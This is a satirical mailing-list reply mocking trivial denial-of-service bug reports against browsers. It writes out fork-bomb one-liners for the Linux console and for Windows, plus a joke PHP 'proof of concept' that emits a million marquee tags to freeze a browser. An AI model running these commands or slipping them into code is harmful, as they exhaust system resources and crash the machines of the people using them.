Subject: Re: DoS vulnerabilities in Firefox,
 Internet Explorer and Opera

Hello list!

I also want to warn you about Denial of Service vulnerability, in almost
every Operating System there is, by e.g., opening a lot of programs at the
same time, or by using Fork bombs such as this in the Linux console: :(){
:|:& };: (Reference: http://en.wikipedia.org/wiki/Fork_bomb ), in Windows
this bug can be: %0|%0 and in browsers, creating a HTML file that writes a
million marquee tags will also make the browser freeze in most cases with
current computing technology.

Proof of Concept:
<?php
// Secret Leaked MustLive DoS script

$i = 0;
$count = 1000000;
$omg = "<marquee>Hello list! I want to warn you about
vulnerability!</marquee>";

while ($i <= $count):
echo $omg; // <-- Send this to FD soon and say it's a bug I discovered a
couple of years ago to make it look even more cool along with 5 links to my
website so it can receive more backlinks and a higher page rank hopefully.
$i++;
endwhile;

?>

While this bug can't be fixed, it will always be a problem (in the future
it will just be larger scales), but as I just stated, it can't be fixed. It
is the same as trying to run Crysis on a Commodore64, it may be possible,
but your machine will respond as if it is experiencing a Denial of Service
attack, if it doesn't report an error such as "Insufficient memory" or "Out
of memory" and crashes instead.
